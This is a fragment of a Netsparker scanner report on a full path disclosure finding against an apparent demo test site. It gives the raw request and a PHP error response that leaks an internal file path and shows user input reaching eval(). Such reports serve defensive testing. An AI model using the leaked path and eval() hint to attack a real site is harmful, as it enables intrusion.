					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Full_Path_Disclosure&#39;&gt;OWASP - Full Path Disclosure&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /hello.php?name=Visitor HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;&gt;
			&lt;div class=&quot;post&quot;&gt;
								&lt;h1 class=&quot;title&quot;&gt;&lt;a href=&quot;#&quot;&gt;Hello Service &lt;/a&gt;&lt;/h1&gt;
					&lt;p&gt;
                    Hello Visitor&lt;br /&gt;
&lt;b&gt;Parse error&lt;/b&gt;:  syntax error, unexpected T_STRING in &lt;b&gt;&lt;span class=&quot;highlight&quot;&gt;C:\AppServ\www\hello.php&lt;/span&gt;(24) : eval()&#39;d code&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;br /&gt;
20$str = 20 Visitor;20                    &lt;/p&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;


				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="IdentifiedInternalPaths">&lt;![CDATA[C:\AppServ\www\hello.php]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC>13</WASC>
							<CWE>200</CWE>
							<CAPEC>118</CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC>C7</OWASPPC>

						</classification>

				</vulnerability>

</netsparker>
